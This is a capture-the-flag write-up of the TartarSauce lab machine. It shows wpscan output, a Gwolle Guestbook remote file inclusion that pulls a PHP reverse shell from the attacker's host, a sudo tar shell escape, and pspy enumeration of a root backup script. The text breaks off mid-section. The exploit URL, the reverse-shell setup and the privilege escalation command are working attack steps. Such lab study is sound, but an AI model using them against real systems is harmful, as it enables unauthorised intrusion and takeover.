 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] gwolle-gb
 | Location: http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-12-09T08:36:00.000Z
 | Readme: http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```

Checking the vulnerability of Gwolle

```
$ searchsploit gwolle   
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion                                                | php/webapps/38861.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Too bad, our version seem sto 2.3.10. However, reading file webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

```
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

= 1.5.3 =
* 2015-10-01
```

It seems we have the vulnerable version after all.

## Initial Access 

Rename a php reverse shell to wp-load.php and start up a web server. Call the webserver using url (note that the trailing slash is important)

```
http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.23:9001/
```

The file is fetched

```
$ python -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.129.1.185 - - [04/Jan/2022 07:35:52] "GET /wp-load.php HTTP/1.0" 200 -
```

And our listener provides us a revershe shell

```
$ nc -nvlp 1234                  
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.1.185] 55962
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 07:36:06 up  2:44,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@TartarSauce:/$ whoami
www-data
www-data@TartarSauce:/$ 
```

## Privilege Escalation www-data to onuma

Rather straightforward escalation of privileges through tar

```
ww-data@TartarSauce:/usr/sbin$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
www-data@TartarSauce:/usr/sbin$ /usr/bin/sudo -u onuma tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
<bin$ /usr/bin/sudo -u onuma tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'  
$ whoami
whoami
onuma
$
```

and capture the flag

```
numa@TartarSauce:~$ pwd
/home/onuma
onuma@TartarSauce:~$ ls -al user.txt
ls -al user.txt
-r-------- 1 onuma onuma 33 Feb  9  2018 user.txt
```

## Privilege Escalation onuma to root

First see if there is anything interesting in onuma's home directory

```
onuma@TartarSauce:~$ cat .mysql_history
_HiStOrY_V2_
create\040database\040backuperer;
exit
```

Also existence of successful sudo file might indicate something

```
numa@TartarSauce:~$ ls -al .sudo_as_admin_successful
-rwxrw---- 1 onuma onuma 0 Feb  9  2018 .sudo_as_admin_successful
```


At this point I've learned to use pspy to see what is happening on the server, and there is also this time some interesting stuff happening

```
022/01/04 08:03:15 CMD: UID=0    PID=17478  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17477  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17476  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17475  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17474  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17473  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17472  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17489  | seq 72 
2022/01/04 08:03:15 CMD: UID=0    PID=17488  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17487  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17492  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17496  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17500  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17502  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17504  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17506  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17508  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17510  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17512  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17514  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17516  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17517  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17518  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17520  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17522  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17524  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17527  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17528  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17531  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17533  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17534  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17536  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17540  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17541  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17542  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17544  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17546  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17547  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17549  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17551  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17552  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17553  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17554  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17556  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17558  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17559  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17561  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17562  | /bin/date 
2022/01/04 08:03:15 CMD: UID=0    PID=17563  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17564  | /bin/rm -rf /var/tmp/. /var/tmp/.. /var/tmp/check 
2022/01/04 08:03:15 CMD: UID=0    PID=17568  | /bin/sleep 30 
2022/01/04 08:03:15 CMD: UID=0    PID=17567  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=1000 PID=17572  | gzip 
2022/01/04 08:03:15 CMD: UID=1000 PID=17571  | /bin/tar -zcvf /var/tmp/.a2a36b52630e5338e648b65e1fad5e2de6664db7 /var/www/html 
2022/01/04 08:03:45 CMD: UID=0    PID=17578  | gzip -d 
2022/01/04 08:03:45 CMD: UID=0    PID=17577  | /bin/tar -zxvf /var/tmp/.a2a36b52630e5338e648b65e1fad5e2de6664db7 -C /var/tmp/check 
2022/01/04 08:03:46 CMD: UID=0    PID=17580  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:46 CMD: UID=0    PID=17579  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:46 CMD: UID=0    PID=17581  | /bin/mv /var/tmp/.a2a36b52630e5338e648b65e1fad5e2de6664db7 /var/backups/onuma-www-dev.bak 
2022/01/04 08:03:46 CMD: UID=0    PID=17582  | /bin/rm -rf /var/tmp/check . .. 
2022/01/04 08:03:46 CMD: UID=0    PID=17583  | 
2022/01/04 08:03:46 CMD: UID=0    PID=17586  | /lib/systemd/systemd-cgroups-agent /system.slice/backuperer.service 
```

An important piece of this puzzle is most like the backuperer script

```
www-data@TartarSauce:/$ ls -al /usr/sbin/backuperer
ls -al /usr/sbin/backuperer
-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer
```



## Privilege Escalation onuma to root

Checking sudo -l starts to give an idea why this box is called tartarsauce.

```
www-data@TartarSauce:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

Check directory /var/backups


